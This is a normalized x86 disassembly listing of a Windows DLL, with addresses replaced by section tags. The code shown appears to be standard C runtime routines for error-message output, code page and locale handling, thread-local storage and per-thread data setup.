mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_10012460
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10012bde
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_10012c0e
mov edi edi
push ebp
mov ebp esp
call sub_1001309c
push [ ebp + 0x8 ]
call sub_10012ef1
push [ rw-data ]
call sub_10013c5b
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10012c37
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10012c8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10012ca9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10012ccd
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10017faf
push r--data
push r--data
call sub_10012ca9
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10015840
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_100169a8
call sub_10010fc6
mov eax r--data
mov [ esp ] r--data
call sub_10012c8c
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_10015840
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10012d52
push 0x18
push r--data
call sub_1000ed24
push 0x8
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012e69
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1000ed69
retn
mov [ rw-data ] ebx
push 0x8
call sub_1001200d
pop ecx
push [ ebp + 0x8 ]
call sub_10012c62
push r--data
mov eax r--data
call sub_10012c8c
pop ecx
push [ rw-data ]
call sub_10013c5b
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10012c8c
pop ecx
push [ rw-data ]
call sub_10013c5b
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_10013c52
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_10013c5b
mov edi eax
call sub_10013c52
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_10013c5b
mov edi eax
push [ rw-data ]
call sub_10013c5b
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_10012ea3
mov edi edi
push esi
call sub_10013c52
mov esi eax
push esi
call sub_10010fdd
push esi
call sub_10016a64
push esi
call sub_1000d7af
push esi
call sub_100184ab
push esi
call sub_1001849c
push esi
call sub_1001828a
push esi
call sub_10015d2f
push esi
call sub_10018279
push sub_10012e7e
call sub_10013be0
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_10012ef1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_1001874c
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_1001874c
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10014440
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_100143d1
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
push esi
call sub_10014440
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_100143d1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10014440
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_10018697
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d7be
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_10018623
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_100184ba
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
push r--data
push ebx
push edi
call sub_10018623
add esp 0xc
test eax eax
je r-xdata
sub_1001309c
push 0x3
call sub_1001874c
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10012ef1
push 0xff
call sub_10012ef1
pop ecx
pop ecx
push 0x3
call sub_1001874c
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100130d5
push 0xc
push r--data
call sub_1000ed24
push 0xe
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001313c
call sub_1000ed69
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1000ced5
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1000ced5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10013150
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_100131d8
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10013207
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000fe10
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1001326b
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10018d5b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10018b5c
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10018b5c
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000fe10
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_100133fe
push 0xc
push r--data
call sub_1000ed24
call sub_10013ee4
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013499
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1000ed69
retn
push 0x20
call sub_10012c0e
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_1000ced5
pop ecx
sub_100134a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001351e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_100134a2
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10013207
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000fe10
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_100131d8
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_1001326b
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000fe10
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_100131d8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10013703
push 0x14
push r--data
call sub_1000ed24
or [ ebp - 0x20 ] 0xffffffff
call sub_10013ee4
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_100133fe
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_100134a2
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10015a7d
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1000ed69
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1001351e
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1000ced5
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1000ced5
pop ecx
push 0xd
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013864
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1000ced5
pop ecx
sub_100138bb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000ced5
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000ced5
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000ced5
push [ esi + 0xc0 ]
call sub_1000ced5
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10018d9d
push [ edi ]
call sub_1000ced5
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1000ced5
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000ced5
pop ecx
push [ esi + 0xb0 ]
call sub_1000ced5
push [ esi + 0xbc ]
call sub_1000ced5
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000ced5
push [ esi + 0xbc ]
call sub_10018f77
pop ecx
pop ecx
push eax
call sub_1000ced5
pop ecx
push eax
call sub_1000ced5
push [ esi + 0xbc ]
call sub_10018f32
pop ecx
pop ecx
sub_10013a04
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10013a93
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_10013b2c
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_10013a04
pop ecx
test esi esi
je r-xdata
push esi
call sub_10013a93
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_100138bb
pop ecx
sub_10013b6a
push 0xc
push r--data
call sub_1000ed24
call sub_10013ee4
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_10013b2c
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013bd4
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10013ee4
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1000ed69
retn
push 0x20
call sub_10012c0e
pop ecx
sub_10013be0
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10012bde
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10013c5b
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10012bde
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_10013cf6
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_10013c5b
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10013d47
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_10011fb6
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_10013d84
push 0xc
push r--data
call sub_1000ed24
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_10012bde
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013e59
push 0xc
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_10013a04
pop ecx
